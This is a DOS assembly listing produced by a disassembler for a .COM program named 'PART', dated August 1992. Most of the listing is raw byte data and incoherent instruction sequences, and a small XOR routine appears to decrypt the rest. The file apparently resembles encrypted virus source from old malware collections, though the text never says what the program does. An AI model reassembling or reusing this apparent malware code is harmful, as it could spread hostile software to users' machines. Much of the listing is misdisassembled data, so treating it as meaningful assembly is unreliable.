
PAGE  59,132

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл								         лл
;лл			        PART				         лл
;лл								         лл
;лл      Created:   10-Aug-92					         лл
;лл      Passes:    5	       Analysis Options on: J		         лл
;лл								         лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

data_11e	equ	0F42h			;*
data_13e	equ	2F42h			;*
data_14e	equ	3F42h			;*
data_15e	equ	65C4h			;*
data_16e	equ	7090h			;*
data_17e	equ	75C4h			;*

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

part		proc	far

start:
		esc	5,dh			; coprocessor escape
		db	0D6h, 2Fh, 12h, 24h, 01h, 49h
		db	 44h, 7Eh, 2Eh, 82h, 01h,0F1h
		db	0F9h, 90h,0DCh,0C3h, 21h, 74h
		db	0EAh, 42h,0EDh, 72h, 81h, 7Bh
		db	0B5h,0E4h, 6Eh, 71h, 64h, 4Ah
		db	 19h,0B6h,0CAh, 28h,0E0h, 17h
		db	0C6h,0B5h, 33h, 36h, 09h,0C2h
		db	0A3h,0A1h, 21h, 9Eh, 30h, 74h
		db	0C5h, 51h,0E1h, 91h, 24h, 99h
		db	 93h, 0Fh,0D0h, 0Dh, 0Ah, 69h
		db	0FEh,0ACh, 27h, 10h,0C5h,0A5h
		db	 1Eh, 94h,0AEh, 1Bh,0DAh, 4Eh
		db	 49h, 58h, 2Fh, 1Dh, 65h,0E4h
		db	 74h,0F6h, 7Eh, 22h, 61h, 2Eh
		db	0D2h,0FDh, 56h, 92h
		db	2Eh
loc_1:
		in	ax,0F7h			; port 0F7h ??I/O Non-standard
		lds	cx,dword ptr [bp+di+75h]	; Load 32 bit ptr
		mov	[bp+si],es
		sbb	al,0DEh
		sub	bp,cx
		out	0Eh,ax			; port 0Eh, DMA-1 clr mask reg
		adc	al,3Eh			; '>'
		sub	ax,73Eh
		and	[bx-39h],dh
		pop	bp
		pop	bx
		mov	dx,0D157h
		and	[bp+si],ax
		inc	sp
		pop	si
		mov	si,ax
;*		pop	cs			; Dangerous 8088 only
		db	0Fh
		pop	cx
		rcl	byte ptr [bp+di+53h],cl	; Rotate thru carry
		pop	di
		loop	locloop_4		; Loop if cx > 0

		sub	[bx-17h],ch
		xor	ax,398Ah
		sal	bh,1			; Shift w/zeros fill
		aaa				; Ascii adjust
		or	[bp+si+7AF0h],ch
		loopnz	$+36h			; Loop if zf=0, cx>0

		xchg	ax,bp
		and	al,0E4h
		jl	loc_1			; Jump if <
		call	$-52ACh
		xchg	ax,cx
		retn	10E7h
		push	di
		int	3			; Debug breakpoint
		xchg	ax,bp
		sub	dh,bh
		inc	cx
		into				; Int 4 on overflow
		aaa				; Ascii adjust
		dec	sp
		db	6Ah

locloop_4:
		push	ss
		jmp	$+422Bh
;*		call	far ptr sub_1		;*
		db	 9Ah, 53h, 67h,0FFh, 82h
		db	 68h,0E9h, 4Bh,0DCh, 76h,0CBh
		db	0E7h, 4Ah,0E4h, 8Ah, 92h,0E2h
		db	 03h, 54h,0CCh, 85h

locloop_5:
		xor	ah,al
		push	cs
		retn
		db	 6Eh, 5Bh, 7Fh, 01h,0E8h, 7Dh
		db	 0Fh, 86h, 52h, 56h,0F9h,0AEh
		db	 2Fh, 95h, 4Bh,0FDh, 77h,0E0h
		db	0E8h, 69h,0ADh
		db	0BBh, 85h, 97h, 02h, 7Ch,0CBh
		db	0A8h, 39h,0DAh, 2Eh, 80h, 4Ah
		db	 74h, 8Ch, 4Ch, 85h, 6Dh, 42h
		db	0FFh, 21h, 35h, 90h,0D0h, 48h
		db	0A5h, 24h, 9Dh, 12h, 82h, 89h
		db	 0Dh,0C4h,0C5h,0E2h,0A7h, 71h
		db	 15h,0B8h,0CCh, 5Ch,0A7h
		db	2Eh
loc_6:
		nop
		pop	ss
		or	[bp+di],cl
		inc	sp
		test	bx,ds:data_11e[di]
		and	bp,ax
		nop
		and	[bx+si+55h],cl
		and	al,6Dh			; 'm'
		adc	dh,[bp+si-77h]
		std				; Set direction flag
		les	si,dword ptr [di]	; Load 32 bit ptr
;*		loop	locloop_12		;*Loop if cx > 0

		db	0E2h, 57h
		jno	loc_6			; Jump if not overflw
		mov	ax,5C3Ch
		push	di
loc_8:
		db	 2Eh, 60h, 17h,0F8h, 0Bh,0B4h
		db	 85h, 8Dh, 42h, 1Fh, 21h,0D5h
		db	 90h, 30h, 48h, 45h, 24h, 7Dh
		db	 12h, 62h, 89h,0EDh,0C4h, 25h
		db	0E2h, 47h, 71h,0F5h,0B8h
		db	 2Ch, 5Ch, 47h, 2Eh
loc_9:
		jo	loc_11			; Jump if overflow=1
		call	$-5BF2h
		test	di,ds:data_13e[di]
		and	bp,sp
		nop
		add	[bx+si+75h],cl
		and	al,4Dh			; 'M'
		adc	dl,[bp+si-77h]
		esc	5,ah			; coprocessor escape
		adc	ax,77E2h
loc_11:
		jno	loc_8			; Jump if not overflw
		mov	ax,5C1Ch
		ja	loc_13			; Jump if above
		inc	ax
		pop	ss
		esc	0,[bp+di]		; coprocessor escape
		xchg	ax,sp
		test	bp,ds:data_14e[di]
		and	bp,si
		nop
		adc	[bx+si+65h],cl
		and	al,5Dh			; ']'
		adc	al,[bp+si-77h]
		int	0C4h			; ??INT Non-standard interrupt
		add	ax,67E2h
;*		jno	loc_10			;*Jump if not overflw
		db	 71h,0D5h
		mov	ax,5C0Ch
		db	 67h, 2Eh, 50h, 17h,0C8h, 0Bh
		db	 84h, 85h,0DDh, 42h, 4Fh, 21h
		db	 85h, 90h
		db	 60h, 48h
loc_13:
		adc	ax,2D24h
		adc	dh,[bp+si]
		mov	ds:data_17e[di],di
;*		loop	locloop_15		;*Loop if cx > 0

		db	0E2h, 17h
		jno	loc_9			; Jump if not overflw
		mov	ax,5C7Ch
		pop	ss
		and	cs:[bx],dl
		mov	ax,0F40Bh
		test	cx,bp
		inc	dx
		pop	di
		and	ds:data_16e[di],dx
		dec	ax
		add	ax,3D24h
		adc	ah,[bp+si]
		mov	ds:data_15e[di],bp
		loop	$+9			; Loop if cx > 0

;*		jno	locloop_12		;*Jump if not overflw
		db	 71h,0B5h
		mov	ax,5C6Ch
		pop	es
		xor	cs:[bx],dl
		test	al,8Bh
		in	ax,84h			; port 84h ??I/O Non-standard
		std				; Set direction flag
		inc	si
		db	 61h, 30h, 55h, 81h, 40h, 48h
		db	 35h,0DAh,0E2h, 12h, 12h, 89h
		db	 9Dh,0C5h,0A4h,0E7h, 39h,0A0h
		db	 62h,0B7h,0ACh, 5Ch, 37h, 27h
		db	0F4h, 15h, 98h, 0Bh,0D4h, 85h
		db	0EDh, 42h, 7Fh, 21h,0B5h, 90h
		db	 50h, 48h, 25h, 24h, 1Dh, 12h
		db	 02h, 89h, 8Dh,0C4h, 45h,0E2h
		db	 27h, 71h, 95h,0B8h, 4Ch, 5Ch
		db	 27h, 2Eh, 10h, 17h, 88h, 5Eh
		db	 6Eh, 00h

part		endp

seg_a		ends



		end	start
